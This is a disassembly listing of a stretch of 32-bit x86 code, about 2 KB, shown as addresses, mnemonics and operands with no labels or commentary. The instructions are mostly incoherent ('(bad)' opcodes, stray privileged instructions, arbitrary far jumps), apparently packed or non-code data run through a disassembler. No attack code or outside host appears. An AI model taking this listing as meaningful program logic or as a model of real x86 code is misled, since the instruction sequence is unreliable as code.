  427361:	jl     0x42737b
  427363:	jns    0x4273df
  427365:	push   es
  427366:	je     0x4273c9
  427368:	hlt    
  427369:	mov    ebp,0xac7dd68b
  42736e:	mov    esi,0x5fc409e3
  427373:	push   edi
  427374:	std    
  427375:	add    bh,BYTE PTR [eax+ecx*1+0x449f5d23]
  42737c:	das    
  42737d:	xchg   edx,eax
  42737e:	pusha  
  42737f:	rcl    DWORD PTR [edi+0x6eef28f4],1
  427385:	jg     0x4273db
  427387:	rol    DWORD PTR [edi+ebp*2+0x30],cl
  42738b:	aas    
  42738c:	jp     0x4273f0
  42738e:	sahf   
  42738f:	fs cdq 
  427391:	lahf   
  427392:	pop    ds
  427393:	cmp    DWORD PTR [ecx-0x47c26ba7],esi
  427399:	das    
  42739a:	jno    0x42736f
  42739c:	inc    edx
  42739d:	js     0x427393
  42739f:	loop   0x427420
  4273a1:	inc    esp
  4273a2:	dec    esi
  4273a3:	mov    WORD PTR [edx],es
  4273a5:	icebp  
  4273a6:	dec    esp
  4273a7:	inc    ebx
  4273a8:	inc    ecx
  4273a9:	add    eax,0xaa912562
  4273ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273af:	dec    esi
  4273b0:	dec    eax
  4273b1:	cwde   
  4273b2:	paddq  mm5,QWORD PTR [edx+esi*1-0x41]
  4273b7:	aaa    
  4273b8:	sub    eax,0xf8956061
  4273bd:	adc    DWORD PTR [eax-0x8e2402c],ebx
  4273c3:	cld    
  4273c4:	or     dh,dh
  4273c6:	retf   
  4273c7:	aam    0x6e
  4273c9:	cmp    ecx,DWORD PTR [ebp-0x6b]
  4273cc:	or     BYTE PTR ds:0xb587664f,cl
  4273d2:	sti    
  4273d3:	imul   esp,DWORD PTR [eax+0x5b],0xd3344365
  4273da:	fmul   DWORD PTR [ebx+0x6f214f0]
  4273e0:	adc    al,0xf9
  4273e2:	(bad)  
  4273e3:	aam    0xee
  4273e5:	xchg   esi,eax
  4273e6:	fisttp WORD PTR [edi]
  4273e8:	pop    ecx
  4273e9:	lea    ebx,[edi]
  4273eb:	retf   
  4273ec:	inc    esp
  4273ed:	add    BYTE PTR [ebx-0x73b7959a],0xd3
  4273f4:	retf   0xb88f
  4273f7:	rcl    DWORD PTR [esi+0x35],0x7f
  4273fb:	test   BYTE PTR [ebx],bh
  4273fd:	mov    dh,0x1f
  4273ff:	shl    DWORD PTR [edx-0x17],0x31
  427403:	js     0x42739d
  427405:	sub    BYTE PTR [edx+0x12d56cd5],ah
  42740b:	bound  ebx,QWORD PTR [ebx]
  42740d:	aam    0x7
  42740f:	push   esi
  427410:	mov    bh,bl
  427412:	jb     0x4273b0
  427414:	mul    DWORD PTR [ecx]
  427416:	fnstcw WORD PTR ds:0x64658f2e
  42741c:	mov    ebx,edi
  42741e:	popa   
  42741f:	mov    ebx,0xcb195653
  427424:	mov    ecx,ebp
  427426:	jl     0x42742f
  427428:	push   es
  427429:	mov    ebx,0x94057e44
  42742e:	int3   
  42742f:	loop   0x427404
  427431:	xchg   DWORD PTR gs:[eax-0x3a],ecx
  427435:	int    0x60
  427437:	arpl   WORD PTR [esi+0x3a2e99b0],sp
  42743d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42743e:	pop    edx
  42743f:	aad    0x7c
  427441:	cli    
  427442:	iret   
  427443:	or     DWORD PTR [edx+0x22],ecx
  427446:	mov    ?,WORD PTR [esi-0x34bba678]
  42744c:	jmp    0x9925:0xe6f0b59c
  427453:	aam    0xa1
  427455:	call   0x5f41:0x4be5a450
  42745c:	mov    ecx,ecx
  42745e:	aas    
  42745f:	and    BYTE PTR ss:[ebx+0x44],0xd3
  427464:	xchg   esi,eax
  427465:	stos   BYTE PTR es:[edi],al
  427466:	shl    DWORD PTR [edi],cl
  427468:	xchg   esp,eax
  427469:	push   ebp
  42746a:	push   es
  42746b:	or     eax,0x9d9e64d6
  427470:	out    0x60,eax
  427472:	mov    eax,eax
  427474:	xchg   ebp,eax
  427475:	fwait
  427476:	mov    al,BYTE PTR [ebx+ebx*1]
  427479:	add    al,al
  42747b:	and    esp,DWORD PTR [eax+0x78d70cff]
  427481:	sar    BYTE PTR [eax+0x4fd34faa],1
  427487:	std    
  427488:	xchg   edi,eax
  427489:	mov    ebx,0x452be1a5
  42748e:	sahf   
  42748f:	not    DWORD PTR [esi+0x45]
  427492:	mov    ecx,0xa21cf6cd
  427497:	imul   edx,DWORD PTR [edx+esi*2-0x7c87c5c1],0xffffffe7
  42749f:	fist   DWORD PTR [ebp-0x25]
  4274a2:	pop    ds
  4274a3:	inc    ecx
  4274a4:	and    DWORD PTR [eax+0x59026bb5],ebp
  4274aa:	repnz aad 0x6b
  4274ad:	dec    esi
  4274ae:	sar    bh,1
  4274b0:	adc    BYTE PTR [edi],ah
  4274b2:	(bad)  [edx+0x711fd88]
  4274b8:	push   0x645be712
  4274bd:	add    dl,ah
  4274bf:	cli    
  4274c0:	and    eax,0xedb1b3db
  4274c5:	jge    0x4274e5
  4274c7:	imul   esp,DWORD PTR [esi+0x1a],0x8b92a944
  4274ce:	(bad)
  4274d1:	add    dh,al
  4274d3:	xchg   edx,eax
  4274d4:	test   BYTE PTR ds:[ecx],bh
  4274d7:	into   
  4274d8:	cli    
  4274d9:	ficomp DWORD PTR [edi]
  4274db:	push   ecx
  4274dc:	mov    eax,ds:0x74a0b8df
  4274e1:	or     edi,ebp
  4274e3:	shl    DWORD PTR [edx+0x23378251],cl
  4274e9:	mov    esp,0xa97aa84f
  4274ee:	pusha  
  4274ef:	popa   
  4274f0:	fs inc edi
  4274f2:	pop    es
  4274f3:	inc    ebx
  4274f4:	test   eax,0xf73d5ce1
  4274f9:	out    dx,al
  4274fa:	pusha  
  4274fb:	sbb    DWORD PTR [ebx-0x7161e5d3],edx
  427501:	cmp    al,0x1e
  427503:	aas    
  427504:	and    eax,0x7792bb53
  427509:	iret   
  42750a:	imul   ebx,DWORD PTR [ebp-0xa],0x43d4193f
  427511:	sti    
  427512:	pusha  
  427513:	test   BYTE PTR [ecx-0x79ea2bdd],ch
  427519:	jae    0x42755c
  42751b:	sbb    BYTE PTR [eax-0x29eb0446],0x52
  427522:	out    dx,al
  427523:	jge    0x42751d
  427525:	add    cl,BYTE PTR [edx]
  427527:	loop   0x4274b9
  427529:	mov    edi,0x79e1d678
  42752e:	stos   BYTE PTR es:[edi],al
  42752f:	mul    DWORD PTR [esi-0x348ce0b1]
  427535:	mov    al,0x14
  427537:	retf   
  427538:	inc    edi
  427539:	add    edi,DWORD PTR [ecx+eax*8+0x5f903e12]
  427540:	(bad)  [ecx]
  427542:	pop    ds
  427543:	stc    
  427544:	shl    DWORD PTR [esi],cl
  427546:	sahf   
  427547:	xor    BYTE PTR [eax-0x7a5580c1],bh
  42754d:	int3   
  42754e:	push   ebp
  42754f:	xchg   ecx,eax
  427550:	add    DWORD PTR [esi+ebx*2],esp
  427553:	sbb    al,BYTE PTR [edx+0x77]
  427556:	in     eax,0xe
  427558:	bound  esp,QWORD PTR [esi+ebx*1]
  42755b:	mov    cl,0x3b
  42755d:	js     0x427561
  42755f:	in     al,dx
  427560:	pop    edx
  427561:	push   ecx
  427562:	push   ecx
  427563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427564:	pop    esp
  427565:	repz iret 
  427567:	(bad)
  42756b:	je     0x4275ab
  42756d:	and    DWORD PTR [esi],ebx
  42756f:	xor    ebp,DWORD PTR [ebp+0x16e5b364]
  427575:	daa    
  427576:	xor    eax,0x148e7c9a
  42757b:	pop    ebx
  42757c:	mov    dl,bh
  42757e:	mov    ds:0x66b3226c,eax
  427583:	les    eax,FWORD PTR [ebp+esi*1+0x1f]
  427587:	pop    ebx
  427588:	(bad)  
  427589:	sbb    eax,0x82de94aa
  42758e:	(bad)  
  427590:	int3   
  427591:	xchg   esp,eax
  427592:	xchg   esp,eax
  427593:	stc    
  427594:	mov    al,ds:0x13659f8a
  427599:	fsubr  QWORD PTR [ecx+0x3]
  42759c:	fcomp  DWORD PTR [edx]
  42759e:	inc    edx
  42759f:	or     ecx,DWORD PTR [ecx]
  4275a1:	popa   
  4275a2:	or     al,0x91
  4275a4:	inc    ecx
  4275a5:	add    esi,DWORD PTR [edx-0x754152b6]
  4275ab:	bound  esi,QWORD PTR [esi+0x51]
  4275ae:	ins    BYTE PTR es:[edi],dx
  4275af:	add    DWORD PTR [eax-0x16833a3c],ebp
  4275b5:	repz mov ds:0xd0035153,eax
  4275bb:	mov    ds:0x5f0c3477,eax
  4275c0:	fld    TBYTE PTR [esi-0x19c062e1]
  4275c6:	mov    esi,0x8f3706d3
  4275cb:	xlat   BYTE PTR ds:[ebx]
  4275cc:	add    eax,0x389407a1
  4275d1:	jg     0x427623
  4275d3:	push   ebp
  4275d4:	push   0x44a51fe1
  4275d9:	sub    BYTE PTR [ebx+0x34],al
  4275dc:	xchg   edx,eax
  4275dd:	jns    0x4275b2
  4275df:	aam    0x67
  4275e1:	mov    edi,0x6433b0
  4275e6:	enter  0x898e,0x7
  4275ea:	mov    bl,0xb8
  4275ec:	add    al,0xd3
  4275ee:	mov    ebx,0xbaddbeb6
  4275f3:	aad    0x1c
  4275f5:	dec    eax
  4275f6:	dec    ebx
  4275f7:	ss int3 
  4275f9:	sbb    ebx,DWORD PTR [esp+esi*1-0x2fe1e64b]
  427600:	or     cl,dh
  427602:	cdq    
  427603:	stos   BYTE PTR es:[edi],al
  427604:	sub    al,0x40
  427606:	clc    
  427607:	aam    0x3b
  427609:	out    0x32,eax
  42760b:	das    
  42760c:	test   eax,0x8814bffb
  427611:	adc    DWORD PTR [edi],esp
  427613:	in     al,dx
  427614:	xchg   al,dh
  427616:	lahf   
  427617:	shl    BYTE PTR [eax],1
  427619:	add    cl,BYTE PTR [esi-0x71]
  42761c:	sahf   
  42761d:	stos   BYTE PTR es:[edi],al
  42761e:	arpl   WORD PTR [edx],bp
  427620:	xchg   esi,eax
  427621:	loop   0x427690
  427623:	mov    bl,0xf7
  427625:	(bad)  
  427626:	fwait
  427627:	jb     0x427691
  427629:	mov    ecx,0x5d36ccf
  42762e:	jbe    0x42766e
  427630:	and    DWORD PTR ds:0x7a5f292f,edx
  427636:	push   ds
  427637:	rcr    DWORD PTR [edx+0x3c97ad60],cl
  42763d:	mov    WORD PTR [edx],ss
  42763f:	aam    0x80
  427641:	add    al,0xc2
  427644:	inc    BYTE PTR [ecx+0x45]
  427647:	outs   dx,DWORD PTR ds:[esi]
  427648:	xchg   edi,esp
  42764a:	int3   
  42764b:	sub    DWORD PTR [esi],eax
  42764d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42764e:	and    BYTE PTR [esi-0x50],ah
  427651:	sbb    BYTE PTR [ebp-0x2b],dl
  427654:	call   0x3f354dcd
  427659:	aad    0x87
  42765b:	jg     0x4275e6
  42765d:	mov    ecx,0xa9ac6f4f
  427662:	mov    BYTE PTR [eax+0x1522406],ah
  427668:	dec    edx
  427669:	pop    ecx
  42766a:	(bad)  
  42766c:	fwait
  42766d:	pop    ebp
  42766e:	aad    0x50
  427670:	mov    cl,0xb7
  427672:	pop    ds
  427673:	push   ebp
  427674:	pop    esi
  427675:	or     edi,edx
  427677:	sub    eax,0xd49bcd54
  42767c:	bound  ebx,QWORD PTR [edi]
  42767e:	jmp    0x427601
  427680:	arpl   WORD PTR [edx],sp
  427682:	mov    dh,0xf5
  427684:	mov    BYTE PTR [ebx-0x34],ch
  427687:	repnz inc eax
  427689:	inc    edx
  42768a:	mov    ebx,0x2e036719
  42768f:	adc    al,0xab
  427691:	cwde   
  427692:	inc    esp
  427693:	repz lock sub eax,0xff1b0764
  42769a:	adc    al,0x5e
  42769c:	test   BYTE PTR [ebp-0x3749dbc],al
  4276a2:	or     BYTE PTR [ebx-0x21a7fd89],cl
  4276a8:	clc    
  4276a9:	stc    
  4276aa:	frndint 
  4276ac:	jnp    0x4276be
  4276ae:	pop    ds
  4276af:	mov    ebp,0xae272847
  4276b4:	xlat   BYTE PTR ds:[ebx]
  4276b5:	mov    al,0x58
  4276b7:	(bad)  
  4276b8:	and    dh,dl
  4276ba:	xchg   edx,eax
  4276bb:	aad    0x68
  4276bd:	sahf   
  4276be:	and    bh,ah
  4276c0:	inc    esp
  4276c1:	in     al,0x75
  4276c3:	ret    0xeb89
  4276c6:	mov    ebp,0x912dda
  4276cb:	popf   
  4276cc:	aam    0xc5
  4276ce:	lods   al,BYTE PTR ds:[si]
  4276d0:	inc    eax
  4276d1:	call   FWORD PTR [ebx-0x3e386bf5]
  4276d7:	(bad)  
  4276d8:	dec    esi
  4276d9:	and    bh,0x85
  4276dc:	jmp    0xa7806df0
  4276e1:	add    eax,0xcb4b575d
  4276e6:	add    bh,ah
  4276e8:	xor    BYTE PTR [ecx],al
  4276ea:	cmp    ch,BYTE PTR [eax+0x6f1c940f]
  4276f0:	stos   DWORD PTR es:[edi],eax
  4276f1:	call   0x443:0x43d70bbc
  4276f8:	and    BYTE PTR ds:0x62388d4c,bl
  4276fe:	lahf   
  4276ff:	int    0x19
  427701:	das    
  427702:	jmp    0x2d140873
  427707:	or     BYTE PTR [ebp+eax*1-0x2446559],0xd7
  42770f:	aad    0x8
  427711:	mov    WORD PTR ds:0x6291645f,ds
  427717:	pop    ebx
  427718:	sub    al,dl
  42771a:	mov    ecx,0x3e18d5a8
  42771f:	adc    al,0xc8
  427721:	add    eax,0x231ee79e
  427726:	push   edi
  427727:	loope  0x4276c2
  427729:	outs   dx,BYTE PTR ds:[esi]
  42772a:	or     esp,edi
  42772c:	xchg   ebp,eax
  42772d:	ret    
  42772e:	ficomp WORD PTR [esi+ebx*8-0x123f7124]
  427735:	push   edx
  427736:	bswap  ebx
  427738:	inc    ecx
  427739:	aam    0x28
  42773b:	cdq    
  42773c:	ja     0x427741
  42773e:	outs   dx,BYTE PTR ds:[esi]
  42773f:	sub    eax,0xeb5a161d
  427744:	jmp    0xad7795b4
  427749:	xor    ecx,esp
  42774b:	fsub   QWORD PTR [edi+ebp*1-0x4c]
  42774f:	aam    0xdf
  427751:	lea    ecx,[edx]
  427753:	cmp    dl,BYTE PTR [esi-0x69f9aa4c]
  427759:	int    0x4b
  42775b:	and    bh,dh
  42775d:	add    bl,BYTE PTR [ebx+eiz*8]
  427760:	sub    BYTE PTR [ebx],ah
  427762:	xchg   esp,eax
  427763:	stos   DWORD PTR es:[edi],eax
  427764:	mov    bl,0x23
  427766:	mov    esp,0x9c420fe8
  42776b:	dec    ecx
  42776c:	xchg   ecx,eax
  42776d:	add    eax,0x6d896117
  427772:	jno    0x4277a9
  427774:	jno    0x427703
  427776:	jne    0x427753
  427778:	sbb    DWORD PTR [eax+eiz*4],0x8e40cee4
  42777f:	cld    
  427780:	sub    BYTE PTR [ebx],ah
  427782:	xchg   BYTE PTR [edi+0x44b43189],dh
  427788:	adc    esp,DWORD PTR [ebx-0xa]
  42778b:	add    al,0x3c
  42778d:	cmp    al,0xa6
  42778f:	add    bh,dl
  427791:	add    dh,BYTE PTR [edi+eax*8]
  427794:	xchg   ebx,eax
  427795:	aas    
  427796:	cmp    DWORD PTR [edi+ebx*2-0x6d],edi
  42779a:	(bad)  
  42779c:	mov    DWORD PTR [ebx+0x2d],eax
  42779f:	mov    al,ds:0x48e94606
  4277a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277a5:	dec    edx
  4277a6:	dec    esi
  4277a7:	(bad)  
  4277a8:	scas   al,BYTE PTR es:[edi]
  4277a9:	or     dl,0x60
  4277ac:	ins    DWORD PTR es:[edi],dx
  4277ad:	jns    0x4277ab
  4277af:	cmp    ch,al
  4277b1:	adc    eax,0x7789ac6a
  4277b6:	sahf   
  4277b7:	nop/reserved BYTE PTR [edx+eiz*8+0x72c4f3d4]
  4277bf:	push   es
  4277c0:	and    eax,0x8c0b0109
  4277c5:	out    dx,eax
  4277c6:	dec    ebp
  4277c7:	(bad)
  4277ca:	push   es
  4277cb:	push   edi
  4277cc:	push   ss
  4277cd:	(bad)  
  4277ce:	ror    al,cl
  4277d0:	fcomp  QWORD PTR [esi]
  4277d2:	bound  esi,QWORD PTR [edx+0x33]
  4277d5:	dec    ebp
  4277d6:	and    al,bh
  4277d8:	daa    
  4277d9:	daa    
  4277da:	mov    al,ds:0x21c216f8
  4277df:	push   ebp
  4277e0:	es stos BYTE PTR es:[edi],al
  4277e2:	and    eax,0x160e52d7
  4277e7:	shr    edi,0x81
  4277ea:	cmp    DWORD PTR ds:0x1819f89,esp
  4277f0:	xchg   ecx,eax
  4277f1:	push   ds
  4277f2:	cdq    
  4277f3:	or     BYTE PTR [eax],al
  4277f5:	add    dh,BYTE PTR [ecx+esi*2+0x7f]
  4277f9:	jl     0x42781e
  4277fb:	imul   edx,DWORD PTR [ebx-0x23],0x4acd3960
  427802:	mov    cs,ebx
  427804:	xchg   esp,eax
  427805:	dec    eax
  427806:	pusha  
  427807:	aad    0x65
  427809:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42780a:	mov    ecx,0x48742681
  42780f:	jmp    0x53626ccd
  427814:	or     al,0x36
  427816:	setg   dh
  427819:	push   ss
  42781a:	fild   QWORD PTR [edx-0x1ffdad1e]
  427820:	xchg   BYTE PTR [edx],al
  427822:	outs   dx,DWORD PTR ds:[esi]
  427823:	std    
  427824:	pop    ds
  427825:	arpl   WORD PTR [esi],bx
  427827:	(bad)  [edx+0x5e]
  42782a:	xchg   edx,eax
  42782b:	xchg   edx,eax
  42782c:	into   
  42782d:	cmp    BYTE PTR [ebp-0xc1c982b],0xb3
  427834:	or     bl,BYTE PTR [edi]
  427836:	xchg   BYTE PTR [ebp-0x77],bh
  427839:	xchg   edi,eax
  42783a:	add    al,0x59
  42783c:	mov    edi,0x9aaeea3e
  427841:	add    ah,dl
  427843:	inc    ebp
  427844:	and    eax,0x2007c1dd
  427849:	push   0x28deff1e
  42784e:	ja     0x4277f2
  427850:	scas   al,BYTE PTR es:[edi]
  427851:	adc    al,0x2c
  427853:	aam    0x6a
  427855:	inc    esp
  427856:	inc    esi
  427857:	push   edi
  427858:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427859:	rcl    esi,cl
  42785b:	inc    ebx
  42785c:	fld    DWORD PTR [ecx-0x1c]
  42785f:	mov    edx,0xd2aaf3fd
  427864:	(bad)  
  427865:	jmp    0x427819
  427867:	push   ds
  427868:	dec    eax
  427869:	shl    BYTE PTR [edx],cl
  42786b:	inc    ebp
  42786c:	loopne 0x42786f
  42786e:	add    al,0xa6
  427870:	push   cs
  427871:	pop    esp
  427872:	jle    0x4278ce
  427874:	dec    ecx
  427875:	cmp    ch,BYTE PTR [ecx-0x5e]
  427878:	mov    DWORD PTR [ebx+0x6f],esi
  42787b:	adc    al,0x17
  42787d:	dec    esp
  42787e:	push   ds
  42787f:	mov    al,0x36
  427881:	lea    edi,[ebx]
  427883:	mov    DWORD PTR cs:[edx+edi*8],esp
  427887:	mov    bl,0xdd
  427889:	(bad)  [edx-0x7ff47775]
  42788f:	cmp    BYTE PTR [ebp-0x2135c1d0],bh
  427895:	daa    
  427896:	aam    0x3f
  427898:	mov    esi,0xba6020f0
  42789d:	cld    
  42789e:	pop    esi
  42789f:	ror    BYTE PTR [edx+0x60827ce3],cl
  4278a5:	or     al,0xde
  4278a7:	dec    ebp
  4278a8:	pusha  
  4278a9:	(bad)  
  4278ab:	mov    edx,0x24d47d3a
  4278b0:	mov    DWORD PTR [esi-0x2],edx
  4278b3:	and    eax,0x551f1d5e
  4278b8:	and    BYTE PTR [eax+0xbb44a10],cl
  4278be:	pop    edx
  4278bf:	loope  0x427882
  4278c1:	sbb    al,0x9e
  4278c3:	aaa    
  4278c4:	jl     0x4278b1
  4278c6:	shl    BYTE PTR ds:0xee0de4e9,1
  4278cc:	ror    ebx,1
  4278ce:	stos   BYTE PTR es:[di],al
  4278d0:	mov    DWORD PTR [ebx],eax
  4278d2:	cmp    ah,BYTE PTR [ebx+edi*1]
  4278d5:	jo     0x427860
  4278d7:	mov    ah,0x43
  4278d9:	sbb    al,0x52
  4278db:	repz mov ch,0xdf
  4278de:	mov    eax,ds:0x452f9b4
  4278e3:	jns    0x427899
  4278e5:	sub    eax,DWORD PTR [esi+ecx*8-0x6921eb82]
  4278ec:	push   ebx
  4278ed:	cli    
  4278ee:	cmp    al,0x17
  4278f0:	cmp    eax,0x9efced95
  4278f5:	daa    
  4278f6:	cli    
  4278f7:	aaa    
  4278f8:	leave  
  4278f9:	punpcklbw mm3,DWORD PTR [eax-0x46]
  4278fd:	pop    ebx
  4278fe:	jle    0x42788b
  427900:	mov    BYTE PTR [edi-0x3be00425],bl
  427906:	sub    eax,0xae1f87c6
  42790b:	retf   
  42790c:	(bad)  
  42790d:	js     0x4278bb
  42790f:	in     eax,0xba
  427911:	mov    ah,0x81
  427913:	int3   
  427914:	xor    al,0x8
  427916:	ss push edi
  427918:	jne    0x4278ce
  42791a:	bound  ebx,QWORD PTR [edi]
  42791c:	pop    esi
  42791d:	push   eax
  42791e:	les    ecx,FWORD PTR [esi+0x6d0fd23c]
  427924:	int3   
  427925:	add    eax,0x2a862534
  42792a:	stc    
  42792b:	cli    
  42792c:	cmp    DWORD PTR [edi+0x7d],ecx
  42792f:	ja     0x427951
  427931:	or     DWORD PTR [ecx-0x5],ebx
  427934:	cmp    dl,al
  427936:	mov    al,ds:0x7d94b440
  42793b:	stc    
  42793c:	rol    DWORD PTR [edx],0x36
  42793f:	mov    al,0x77
  427941:	in     eax,0x51
  427943:	test   BYTE PTR [esi+0x7d5e063d],bl
  427949:	fcomp  DWORD PTR [edi]
  42794b:	dec    edi
  42794c:	cmp    BYTE PTR [edx-0x42],0x92
  427950:	xor    cl,dl
  427952:	xlat   BYTE PTR cs:[ebx]
  427954:	xlat   BYTE PTR ds:[ebx]
  427955:	mov    eax,0x3eeb48b8
  42795a:	xor    BYTE PTR [eax+ebp*4+0x5767637e],ah
  427961:	mov    BYTE PTR [ecx+0x39],ah
  427964:	fadd   st,st(2)
  427966:	neg    ebx
  427968:	jl     0x42798f
  42796a:	fs jo  0x427999
  42796d:	xchg   esi,eax
  42796e:	loopne 0x4279c6
  427970:	call   0x9f59a954
  427975:	xchg   edi,eax
  427976:	stos   DWORD PTR es:[edi],eax
  427977:	mov    ebp,0x47090226
  42797c:	pop    edx
  42797d:	mov    ds:0x9e3d5d7,eax
  427982:	adc    ah,BYTE PTR [ebx+0x74d3f46a]
  427988:	mov    DWORD PTR [ecx+0x27],esi
  42798b:	xor    DWORD PTR [edi+0x1d],eax
  42798e:	mov    dl,0x59
  427990:	and    esp,DWORD PTR [esi]
  427992:	mov    al,0x7e
  427994:	mov    BYTE PTR [edx-0x66],ah
  427997:	push   ebp
  427998:	clc    
  427999:	cmp    al,0x73
  42799b:	cmp    ch,BYTE PTR ds:0xb1a762ca
  4279a1:	pop    ds
  4279a2:	test   eax,0xa08eeded
  4279a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279a8:	mov    ds:0xc7d6ba02,eax
  4279ad:	mov    ch,0x6
  4279af:	add    esi,esi
  4279b1:	pop    edi
  4279b2:	adc    BYTE PTR [esi],bh
  4279b4:	mov    gs,ebp
  4279b6:	mov    bl,BYTE PTR [ecx+0x5205a32]
  4279bc:	dec    esi
  4279bd:	xlat   BYTE PTR ds:[ebx]
  4279be:	call   DWORD PTR [ebx+esi*8]
  4279c1:	inc    esp
  4279c2:	mov    BYTE PTR ds:0x5d7b6e6e,0xad
  4279c9:	sub    al,0xad
  4279cb:	std    
  4279cc:	jo     0x427a11
  4279ce:	hlt    
  4279cf:	or     eax,0x931f1a15
  4279d4:	and    eax,DWORD PTR [ebx-0x482322f7]
  4279da:	add    ah,dl
  4279dc:	dec    edx
  4279dd:	pop    ds
  4279de:	cli    
  4279df:	cs xchg ebx,eax
  4279e1:	push   0xfffffffb
  4279e3:	sbb    DWORD PTR [edi-0x3d560117],edx
  4279e9:	add    edi,DWORD PTR [edi+0xfae5f0]
  4279ef:	pop    es
  4279f0:	scas   al,BYTE PTR es:[edi]
  4279f1:	pop    ds
  4279f2:	into   
  4279f3:	jo     0x427a6b
  4279f5:	mov    ah,bl
  4279f7:	sar    DWORD PTR [eax+0x45],1
  4279fa:	jmp    0x4279c1
  4279fc:	xchg   DWORD PTR [ebp-0x15cd9a8f],esp
  427a02:	call   FWORD PTR [ecx]
  427a04:	stos   BYTE PTR es:[edi],al
  427a05:	cdq    
  427a06:	adc    al,0xa2
  427a08:	and    al,0x7c
  427a0a:	pop    eax
  427a0b:	ror    BYTE PTR [eax-0x63ecda72],1
  427a11:	out    0x65,al
  427a13:	add    edi,edi
  427a15:	sub    ebx,DWORD PTR [edx+0x7892c76b]
  427a1b:	daa    
  427a1c:	les    ecx,FWORD PTR [ebx]
  427a1e:	pop    ss
  427a1f:	call   0xc694c349
  427a24:	addr16 inc edi
  427a26:	pop    eax
  427a27:	fs jge 0x427a2d
  427a2a:	hlt    
  427a2b:	aas    
  427a2c:	and    al,0x9c
  427a2e:	xor    BYTE PTR [ecx],0x9
  427a31:	sub    bl,BYTE PTR [edi]
  427a33:	aad    0x76
  427a35:	sbb    DWORD PTR [edi+ebx*4-0x61c6b1d4],esi
  427a3c:	cmp    edi,esi
  427a3e:	mov    esp,0x69d49d53
  427a43:	sub    BYTE PTR [esi+0x51],ch
  427a46:	lahf   
  427a47:	dec    esi
  427a48:	jmp    0x427a3f
  427a4a:	or     eax,0xcd9a3c
  427a4f:	or     esp,DWORD PTR [ecx-0x4bcf89fb]
  427a55:	cs sub edi,edx
  427a58:	out    dx,eax
  427a59:	xor    BYTE PTR [esi-0x75],ah
  427a5c:	cmp    BYTE PTR [ebx+0x33],ah
  427a5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a60:	mov    BYTE PTR ds:0xbe16624f,ch
  427a66:	jecxz  0x427a7d
  427a68:	(bad)
  427a6c:	mov    dh,0x6a
  427a6e:	loope  0x427ab7
  427a70:	and    ch,BYTE PTR [edx-0x36789ac4]
  427a76:	add    eax,0xcaa0ce62
  427a7c:	js     0x427a06
  427a7e:	jmp    0x714a:0x4b629fd5
  427a85:	das    
  427a86:	mov    ss,WORD PTR [edi+0x5c]
  427a89:	daa    
  427a8a:	pop    ds
  427a8b:	in     eax,dx
  427a8c:	sub    BYTE PTR [ebp-0x5d],ah
  427a8f:	repnz cdq 
  427a91:	jmp    0x2916bf3
  427a96:	mov    al,ds:0x55ad661d
  427a9b:	dec    esi
  427a9c:	test   al,0x52
  427a9e:	jnp    0x427b07
  427aa0:	mov    edx,0x1f572181
  427aa5:	sbb    eax,0xfe66198a
  427aaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427aab:	mov    eax,0xf057e61e
  427ab0:	mov    cl,dh
  427ab2:	lea    edx,[esi]
  427ab4:	jb     0x427a40
  427ab6:	sub    ah,0x10
  427ab9:	loopne 0x427af3
  427abb:	cdq    
  427abc:	sbb    esp,edx
  427abe:	loopne 0x427ae9
  427ac0:	int3   
  427ac1:	jg     0x427b0f
  427ac3:	jmp    0x51f3:0xb1d202cb
  427aca:	inc    esi
  427acb:	lods   al,BYTE PTR ds:[esi]
  427acc:	nop
  427acd:	add    al,0x60
  427acf:	sbb    DWORD PTR [edi-0x70],esp
  427ad2:	and    dl,BYTE PTR [edx-0x4e3bdf5e]
  427ad8:	pop    esi
  427ad9:	cmp    al,0xc
  427adb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427adc:	stos   BYTE PTR es:[edi],al
  427add:	je     0x427afa
  427adf:	stos   BYTE PTR es:[edi],al
  427ae0:	pop    ebx
  427ae1:	jecxz  0x427aa4
  427ae3:	mov    ebp,0x8f1e1cbc
  427ae8:	arpl   bx,sp
  427aea:	push   edi
  427aeb:	adc    bh,BYTE PTR [ebp+eax*8-0x61e32b7c]
  427af2:	aas    
  427af3:	jge    0x427aec
  427af5:	inc    edi
  427af6:	sub    eax,eax
  427af8:	mov    al,ds:0xe9dfac51
  427afd:	adc    al,0x40
  427aff:	shl    DWORD PTR [edi+0x29],cl
  427b02:	pop    ebp
  427b03:	adc    al,0x75
  427b05:	ins    BYTE PTR es:[edi],dx
  427b06:	test   al,0xb2
  427b08:	int    0x2
  427b0a:	data16 fdiv QWORD PTR [esi]
  427b0d:	adc    al,0x90
  427b0f:	xchg   esi,eax
  427b10:	nop
  427b11:	ds je  0x427b03
  427b14:	sbb    al,0xb4
  427b16:	adc    ah,0x35
  427b19:	jle    0x427b89
  427b1b:	cmp    eax,0xa530df3c
  427b20:	scas   al,BYTE PTR es:[edi]
  427b21:	retf   0x484a
  427b24:	out    0xc2,al
  427b26:	cmp    al,0xde
  427b28:	mov    cl,BYTE PTR ds:0x9b89df37
  427b2e:	inc    BYTE PTR [eax+ebx*4+0x45]
  427b32:	ss or  eax,0x403c0348
  427b38:	arpl   WORD PTR [eax+0x3f],dx
  427b3b:	push   0x1c
  427b3d:	jns    0x427b9f
  427b3f:	(bad)  
  427b40:	jnp    0x427b1a
  427b42:	mov    eax,fs:0x68de0118
  427b48:	pop    ecx
  427b49:	add    BYTE PTR [eax-0x2545c781],dl
  427b4f:	mov    bh,0xa
  427b51:	stos   BYTE PTR es:[edi],al
  427b52:	pop    esp
  427b53:	mov    ss,WORD PTR [eax+0x33]
  427b56:	push   ds
  427b57:	fst    DWORD PTR [edi-0x7c]
  427b5a:	mov    bh,0xac
  427b5c:	ror    BYTE PTR [eax],cl
  427b5e:	cwde   
  427b5f:	scas   eax,DWORD PTR es:[edi]
  427b60:	jge    0x427af6
  427b62:	cld    
  427b63:	(bad)  
  427b64:	(bad)  
  427b65:	and    al,0xb8
